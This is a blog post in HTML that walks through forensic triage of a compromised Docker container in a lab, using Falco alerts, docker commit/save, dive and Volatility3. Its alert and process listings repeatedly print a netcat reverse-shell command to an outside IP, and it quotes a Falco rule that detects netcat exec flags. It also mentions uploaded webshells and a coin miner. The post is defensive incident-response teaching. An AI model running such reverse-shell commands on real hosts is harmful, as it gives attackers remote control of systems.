<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>compromised_container_analysis_primer | JellyParks</title><meta name=keywords content="containers,linux,dfir"><meta name=description content="Walkthrough of basic triaging and analysis of a container which has been compromised."><meta name=author content="Travis"><link rel=canonical href=https://jellyparks.com/posts/compromised-container-analysis-primer/><link crossorigin=anonymous href=/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.e85ad0406048e8176e1c7661b25d5c69297ddfe41dc4124cf75ecb99a4f7b3d1.js integrity="sha256-6FrQQGBI6BduHHZhsl1caSl93+QdxBJM917LmaT3s9E=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://jellyparks.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://jellyparks.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-13VPCR43BS"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-13VPCR43BS",{anonymize_ip:!1})}</script><meta property="og:title" content="compromised_container_analysis_primer"><meta property="og:description" content="Walkthrough of basic triaging and analysis of a container which has been compromised."><meta property="og:type" content="article"><meta property="og:url" content="https://jellyparks.com/posts/compromised-container-analysis-primer/"><meta property="og:image" content="https://jellyparks.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-10T00:00:00+00:00"><meta property="article:modified_time" content="2022-05-10T00:00:00+00:00"><meta property="og:site_name" content="JellyParks"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://jellyparks.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="compromised_container_analysis_primer"><meta name=twitter:description content="Walkthrough of basic triaging and analysis of a container which has been compromised."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://jellyparks.com/posts/"},{"@type":"ListItem","position":3,"name":"compromised_container_analysis_primer","item":"https://jellyparks.com/posts/compromised-container-analysis-primer/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"compromised_container_analysis_primer","name":"compromised_container_analysis_primer","description":"Walkthrough of basic triaging and analysis of a container which has been compromised.","keywords":["containers","linux","dfir"],"articleBody":" This post is going to focus on the triaging and analysis of a container that has been compromised.\nPIDs Before we get into the actual analysis lets start with a quick overview of how processes exist in containers. When you run PS inside a container you typically get a very short list of running processes and not all of the processes that are currently running on the underlying host. This is due to one of the foundational compoents that make a container a container, namespaces. Linux namespaces isolate the proceses within containers. What does this look like in practice? Lets look.\nTake for example the following line from a ps aux output ran on a host.\nUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 2954 0.0 0.0 4200 740 pts/1 S+ 02:41 0:00 ping 8.8.8.8 We can see this process has a PID of 2954. Looking at pstree we can see this process is a child of bash, which is a child of containerd-shim\nsystemd(1)───containerd-shim(2396)───bash(2604)───ping(2954) If we exec into the container and run the same ps commands we get a completely different pid:\nUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 379 0.0 0.0 4200 740 pts/1 S+ 02:41 0:00 ping 8.8.8.8 This is due to the Linux namespace restricting our view so we can only see processes that exist “within” the container. If we attempt to kill PID 2954 on the host from within the container we will get an error that no such process exists. We could however kill process 379 without any issue.\nFor a much more indepth explaination I highly reccommend the book Container Security: Fundamental Technology Concepts that Protect Containerized Applications by Liz Rice. Last I checked Aqua security was giving the ebook away for free.\nThe Scene Moving on to a more practical example let’s pretend that we get an alert from a Falco agent running on a host. In fact several alerts are generated for this behavior, but for our purposes just the one will be enough to kick of this investigation. Falco is a great tool and free to use. The fact that it is container aware makes very helpful when looking to detect suspicious and malicious behavior in a container environment. The alert which was generated is below:\n{ \"output\": \"21:39:47.159547041: Warning Netcat runs inside container that allows remote code execution (user=www-data user_loginuid=-1 command=nc 172.31.93.20 9876 -e /bin/sh container_id=60795d68fdee container_name=eloquent_babbage image=webapp:v1.0)\", \"priority\": \"Warning\", \"rule\": \"Netcat Remote Code Execution in Container\", \"source\": \"syscall\", \"tags\": [ \"mitre_execution\", \"network\", \"process\" ], \"time\": \"2022-05-10T21:39:47.159547041Z\", \"output_fields\": { \"container.id\": \"60795d68fdee\", \"container.image.repository\": \"webapp\", \"container.image.tag\": \"v1.0\", \"container.name\": \"eloquent_babbage\", \"evt.time\": 1652218787159547100, \"proc.cmdline\": \"nc 172.31.93.20 9876 -e /bin/sh\", \"user.loginuid\": -1, \"user.name\": \"www-data\" } } The rule name is Netcat Remote Code Execution in Container (ruh roh). In the output fields section we can see all kinds of useful information such as data about the image, the running container name, the command line associated with the alert, and the user that ran the command. Looking at the rule syntax it is a fairly simple rule.\nspawned_process and container and ((proc.name = \"nc\" and (proc.args contains \"-e\" or proc.args contains \"-c\")) or (proc.name = \"ncat\" and (proc.args contains \"--sh-exec\" or proc.args contains \"--exec\" or proc.args contains \"-e \" or proc.args contains \"-c \" or proc.args contains \"--lua-exec\")) ) The output for the rule is:\noutput: \u003e Netcat runs inside container that allows remote code execution (user=%user.name user_loginuid=%user.loginuid command=%proc.cmdline container_id=%container.id container_name=%container.name image=%container.image.repository:%container.image.tag) If we wanted to have additional information such as process id or parent process id in the output we could add that. Hindsight being what it is, had I thought of this before starting to write this post I would have added pid details to the rule output for additional context.\nComparing the rule to the process cmdline included in the output_fields we can see clearly why it was triggered.\nOn the host when we run ps aux we see an output similar to the one below.\nUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND www-data 12520 0.0 0.0 4296 796 ? S 21:53 0:00 sh -c ping -c 4 \u0026 nc 172.31.93.20 9876 -e /bin/sh Digging deeper if we run pstree -asp 12520 we see that the nc process is a child of apache2.\npstree -asp 12520 systemd,1 └─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock └─main.sh,11992 /main.sh └─apache2,12323 -k start └─apache2,12336 -k start └─sh,12520 -c ping -c 4 \u0026 nc 172.31.93.20 9876 -e /bin/sh └─sh,12522 -c /bin/sh └─sh,12523 nc usage is common in most place where Linux is used. It is not common to see nc as a child process of apache2. At this point several additional alerts from Falco start to roll in, and after speaking with the application owner we learn nc was added to the container for troubleshooting connectivity issues, but they always ran it from a shell in the container as root never as the apache user (not ideal but it is what it is). The app owners also confirmed they have not been doing any testing recently. If this were a real scenario this host would probably be isolated if possible and attempts would be made to understand what kind of data is processed on the machine. Thankfully this is just a lab and all of that is out of scope for this post :-).\nWe know there is an active nc session, but what else has occured in the container? Let’s dive into the image a figure it out.\nCarving the running container out First lets grab the eqivilant of a disk image of the running container this. We’ll be able to perform an analysis on the image and it also preserves the image in the event that the container is killed. Note: this post mainly focuses on the container itself, opperating within a Kubernetes cluster is highly likely in a scenario similar to this. There are additional things that should occur when performing analysis on a Kubernetes cluster to preserve and protect both the running container and the host that the container is running on. Failure to do so may result in the entire node being terminated and all relevant evidence along with it.\nLets determine the container id where this process lives. We can do this by looking at the -id parameter associated with the containerd-shim process from the pstree command.\n└─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock If multiple containers exist we would need to trace the tree up to the relevant container-shim process. Additionally in our scenario Falco provided the container id in the alert for us.\n\"container.id\": \"60795d68fdee\", If we want we can run the docker ps command to validate the container is still running.\ndocker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 60795d68fdee webapp:v1.0 \"/main.sh\" 3 hours ago Up 3 hours 0.0.0.0:80-\u003e80/tcp, :::80-\u003e80/tcp eloquent_babbage Now that we know the container ID we can create an image from the running container preserving any changes that have occured since the container was launched. The commit command below tells docker to create a new image name sec-incident, tag it with 123, and use the running container id 6079 to build the image. Effectivly taking a snapshot of the container as it currently exists.\ndocker commit 6079 sec-incident:123 When we run the docker images command we see our new image, as well as the orignal image the container launched with.\nREPOSITORY TAG IMAGE ID CREATED SIZE sec-incident 123 9f64c8bead0e 21 seconds ago 845MB webapp v1.0 7adda9b17363 3 hours ago 714MB Comparing the sizes of the two images there have been lots of changes within the image since it was first launched. Next we will save the image to disk so it is portable and can be moved to our analysis workstation.\ndocker save sec-incident:123 -o sec-incident.tar It is important to note we are using the docker save command specifying the image we created from the running container instead of the docker export command on the running container. Both will produce a tar file. The biggest difference is that the export command will flatten the image/layer history. Save on the other hand will preserve all of the layer history. For our use case preserving the history is very helpful when analyzing how the image has shifted from its initial launch. From here as an analyst the tar files will more than likely be exported to an analysis machine.\nOnce we are on our analyst workstation we need to perform a docker load on the tar file produced from the docker save command above. This will trigger the following output:\ndocker load \u003c sec-incident.tar a75caa09eb1f: Loading layer [==================================================\u003e] 105MB/105MB 80f9a8427b18: Loading layer [==================================================\u003e] 494.7MB/494.7MB 97a1040801c3: Loading layer [==================================================\u003e] 7.168kB/7.168kB acf8abb873ce: Loading layer [==================================================\u003e] 5.655MB/5.655MB 9713610e6ec4: Loading layer [==================================================\u003e] 5.632kB/5.632kB 73e92d5f2a6c: Loading layer [==================================================\u003e] 5.658MB/5.658MB 585e40f29c46: Loading layer [==================================================\u003e] 114.3MB/114.3MB deeea3c4d56f: Loading layer [==================================================\u003e] 2.048kB/2.048kB 9ef9e3967882: Loading layer [==================================================\u003e] 121.7MB/121.7MB Loaded image: sec-incident-123:latest From this output we can tell there are 9 unique layers to this image.\nWhat is an Image Before progressing any further lets take a step back and talk about what an image is. An image according to docker.com is “…a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.” Technically however an image is just a collection of tar’d files/folders. Each layer is a folder within the tar file. Within each layers folder contains information about the layer, and then any files associated with that particular layer.\nIn our example when we extract the sec-incident.tar file we see an output that contains a layer folder, inside of that folder is a VERSION, json, and layer.tar file. Additionally at the root level of the image there is manifest.json, repositories, and a 9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json file. The 9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json file uses the hash of the image. The image hash is a sha256sum of this config file.\ntar -xvf sec-incident.tar 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/ 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/VERSION 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/json 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar 2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/ 2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/VERSION 2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/json 2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar 69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/ 69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/VERSION 69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/json 69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/ 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/VERSION 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/json 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar 8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/ 8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/VERSION 8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/json 8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar 9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/ 9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/VERSION 9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/json 9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar 9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/ a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/VERSION a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/json a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/ c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/VERSION c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/json c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/ c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/VERSION c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/json c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/ ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/VERSION ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/json ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/ caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/VERSION caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/json caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar manifest.json repositories The manifest.json file shows us information about the layers in the image as well as the repo/tags associated with the image\n[ { \"Config\": \"9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json\", \"RepoTags\": [ \"sec-incident:123\" ], \"Layers\": [ \"69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar\", \"9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar\", \"1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar\", \"c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar\", \"c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar\", \"a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar\", \"2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar\", \"caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar\", \"8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar\", \"ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar\", \"6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar\" ] } ] The repositories file is just meta-data about the image:\n{\"sec-incident\":{\"123\":\"6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2\"}} When we look at the 9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json config file we can see all of the layers and what commands were used to create the layer. Below is a snip from the file:\n{ \"created\": \"2018-10-12T17:49:01.240444043Z\", \"created_by\": \"/bin/sh -c #(nop) ENTRYPOINT [\\\"/main.sh\\\"]\", \"empty_layer\": true }, { \"created\": \"2022-05-10T21:32:10.671619454Z\", \"created_by\": \"/bin/sh -c #(nop) COPY file:2d20aa4eee806c995fcc211ba0077b67c72aa53ac0ba27ec57a721820907c4ff in /bin/nc \" }, { \"created\": \"2022-05-10T21:32:11.329409992Z\", \"created_by\": \"/bin/sh -c chmod +x /bin/nc\" }, { \"created\": \"2022-05-11T00:38:09.016419258Z\" } In the above output we can clearly see the original image launch layer which was created 2018-10-12 by the command /bin/sh -c with the entrypoint of main.sh. Below that we see two additional layers added by the application owner for troubleshooting purposes where they copied nc into the image and then made the file executable /bin/sh -c chmod +x /bin/nc. The last layer only has a timestamp, but no other information. This is the layer where we will want to look because it will contain any changes to the file system since the container was started. Before we start to unpack each layer and manually trompsing through all the files lets make things easier and utilize a tool built specifically to help us visualize the data we want to see.\nDive There are a few different tools that can be used to perform static analysis of a container image. One of my favorites is dive. Dive is “a tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI Image.” Obviously for our purposes we do not care about shrinking the image we just want to be able to explore the image at each of the various layers.\nOnce installed on our analysis system we can run the tool with:\ndive sec-incident:123 This will process our image and provide us with a really nice ui to navigate through it.\nOnce the ui loads in the top left panel we can see all of the image layers. Using the arrow keys we can move between the layers. The bottom layer contains all of the changes that occurred since the image was started up to the time we saved the image. In our case ~132MB of changes occured.\nIn the section below we can see the layer details. This includes the ID and Digest. We will use the Id (6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2) later when we go to extract specific files from the image.\nOn the right we can see all of the contents of the filesystem at the current layer. Pressing tab will allow us to use the arrow keys once again to navigate through the file system, space will collapse/expand a folder. This includes files from the previous layers. Dive color codes the files to show files that are new to the layer (green) and those files which have been modified when compared to the previous layer (yellow).\nWe can see that a new php session file was created, and that the access and error log files were modified, likely due to webtraffic to the application. In the image below we see several new files that have been created. Each file is worth digging into deeper to gain some understanding as to what has occurred.\nUnfortunatly dive does not offer the ability to extract a file directly. To dig into the files themselves to better understand what has occured we will have to extract the layer from the raw image file.\nFile Analysis Back in our extracted image folder we can use the layer id identified using Dive to selectivly target the layer we want.\nWe want to carve files out that occured within the most recent layer created for the image. Using the what we learned from Dive we know the layer id we want to explore is 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2.\nWithin the folder for the layer we will extract the layer.tar file with a tar -xvf layer.tar. This presents us with the changes in the filesystem at the current layer of the image. Using what we learned from Dive above we can navigate to files of interest and begin to inspect them to determine what there intent was.\nIntermission During analysis we learn the curl binary was uploaded in parts and then rebuilt as ifj. A coinminer (xmrig) was also uploaded in parts and rebuilt as the binary 8. Additionally several webshells were uploaded. Given the timestamps of when all of the files appear to have been created it would appear it was the same actor copying the same shell to maintain access in the event that one of the shells was discovered and deleted. The web access logs confirm that the same ip address was used for all of the requests where malicious files started to appear. The webshells were identical copies of a version of Web Shell Orb, a fairly full featured webshell with various capabilities.\nMemory Analysis Collection of memory occurs just as it would for any other Linux host. For this post LiME was used, but avml is also an option. Since this is a lab environment and the scenario is a bit contrived disk analysis tells enough of the story for us to understand what has occurred. If this were a bit more realistic the 8 binary probably would have been deleted from disk and we would either recover it from /proc//exe or we would carve it out of memory to perform analysis on it and determine what the binaries purpose was. With that in mind I chose to skip digging into that and instead chose to dig into some special things about container memory analysis with volatility.\nVolatility2 When it comes to memory analysis with volatility there really isn’t anything special about analyzing activity that has occurred in a container vs outside on the host. The most important thing to remember is when analyzing processes is to utilize the PID of the suspicious processes on at the host level and not the container native PIDs.\nVolatility3 Container analysis with volatility3 is a little bit different than it is with volatility. The main reason for this is the volatility-docker plugin built by Ofek Shaked \u0026 Amir Sheffer. This plugin adds namespace support and various docker specific commands which can aid in understanding the dump.\nOne example is the additional argument added to the suite of ps commands: nsinfo. This argument will display information about the namespace associated with a particular pid.\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.pstree.PsTree --nsinfo Below is a sample output of the pstree module showing nsinfo.\nPID PPID COMM Start Time (UTC) PID in NS UTS NS IPC NS MNT NS NET NS PID NS USER NS * 11971 1 containerd-shim 2022-05-10 21:37:46.453 11971 4026531838 4026531839 4026531840 4026532040 4026531836 4026531837 ** 11992 11971 main.sh 2022-05-10 21:37:46.489 1 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 *** 12323 11992 apache2 2022-05-10 21:37:49.355 308 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 **** 12334 12323 apache2 2022-05-10 21:37:49.428 319 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 **** 12335 12323 apache2 2022-05-10 21:37:49.428 320 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 **** 12336 12323 apache2 2022-05-10 21:37:49.429 321 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 **** 12337 12323 apache2 2022-05-10 21:37:49.429 322 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 ***** 12795 12337 sh 2022-05-11 00:31:20.254 411 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 ****** 12797 12795 sh 2022-05-11 00:31:20.255 413 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 ******* 12798 12797 sh 2022-05-11 00:31:20.261 414 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 ******** 12816 12798 8 2022-05-11 00:33:19.062 430 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 In the table above we can see main.sh is a child of containerd-shim which indicates this is a process in a container. Additionally the pid for main.sh in the NS (PID in NS column) is 1 which tells us this is the pid used to start the container. Below that we can see other PIDs which are related to host pid 11992, and are in the same namespace. We can use the namespace information to determine all of the pids associated with this container even if they have forked away and no longer appear as child processes. Furthermore this mapping can be really helpful if the initial alert source that triggered the investigation is only showing the PID within the namespace.\nThe docker plugin itself adds several new capabilities. The output below shows the available arguments:\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.docker.Docker -h optional arguments: -h, --help show this help message and exit --detector Detect Docker daemon / containers in memory --ps List of running containers --ps-extended Extended list of running containers --inspect-caps Inspect containers capabilities --inspect-mounts Show a list of containers mounts --inspect-mounts-extended Show detailed list of containers mounts --inspect-networks Show detailed list of containers networks --inspect-networks-extended Show detailed list of containers networks The --detector argument attempts to detect if docker was being used on the system. This can be helpful if you are not sure if docker was being used on the system.\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --detector Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished Docker inetrface Docker veth Mounted Overlay FS Containerd-shim is running True True True True --ps and --ps-extended emulates the docker ps command showing all containers within the dump and details about them.\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --ps Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished Container ID Command Creation Time (UTC) PID 60795d68fdee main.sh 2022-05-10 16:29:25.908 11992 --- python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --ps-extended Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished Creation time (UTC) Command Container ID Is privileged PID Effective UID 2022-05-10 16:29:25.908 main.sh 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 False 11992 0 To see the capabilities associated with a container the --inspect-caps argument can be used. Having an understanding of a containers capabilities can help shed light on what possible damage it could cause to the underlying system or neighboring containers. This will generate an output similar to below:\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-caps Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished PID Container ID Effective Capabilities Mask Effective Capabilities Mames 11992 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 0xa80425fb CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP The --inspect-networks argument will show the containers and the associated networks. If more than one container is in the same network the truncated container id’s are comma seperated.\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-networks Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished Network /16 Segment Containers IDs 172.17 60795d68fdee, ","wordCount":"3461","inLanguage":"en","datePublished":"2022-05-10T00:00:00Z","dateModified":"2022-05-10T00:00:00Z","author":{"@type":"Person","name":"Travis"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://jellyparks.com/posts/compromised-container-analysis-primer/"},"publisher":{"@type":"Organization","name":"JellyParks","logo":{"@type":"ImageObject","url":"https://jellyparks.com/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://jellyparks.com accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://jellyparks.com/posts title=all_posts><span>all_posts</span></a></li><li><a href=https://jellyparks.com/categories/ title=categories><span>categories</span></a></li><li><a href=https://jellyparks.com/tags/ title=tags><span>tags</span></a></li><li><a href=https://jellyparks.com/me/ title=me><span>me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://jellyparks.com>Home</a>&nbsp;»&nbsp;<a href=https://jellyparks.com/posts/>Posts</a></div><h1 class=post-title>compromised_container_analysis_primer</h1><div class=post-meta><span title='2022-05-10 00:00:00 +0000 UTC'>May 10, 2022</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;Travis&nbsp;|&nbsp;<a href=https://github.com/yogisec/yogisec.github.io/blob/main/content/posts/compromised-container-analysis-primer/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#pids aria-label=PIDs>PIDs</a></li><li><a href=#the-scene aria-label="The Scene">The Scene</a></li><li><a href=#carving-the-running-container-out aria-label="Carving the running container out">Carving the running container out</a></li><li><a href=#what-is-an-image aria-label="What is an Image">What is an Image</a></li><li><a href=#dive aria-label=Dive>Dive</a></li><li><a href=#file-analysis aria-label="File Analysis">File Analysis</a></li><li><a href=#intermission aria-label=Intermission>Intermission</a></li><li><a href=#memory-analysis aria-label="Memory Analysis">Memory Analysis</a><ul><li><a href=#volatility2 aria-label=Volatility2>Volatility2</a></li><li><a href=#volatility3 aria-label=Volatility3>Volatility3</a></li></ul></li></ul></div></details></div><div class=post-content><hr><p>This post is going to focus on the triaging and analysis of a container that has been compromised.</p><hr><h3 id=pids>PIDs<a hidden class=anchor aria-hidden=true href=#pids>#</a></h3><p>Before we get into the actual analysis lets start with a quick overview of how processes exist in containers. When you run PS inside a container you typically get a very short list of running processes and not all of the processes that are 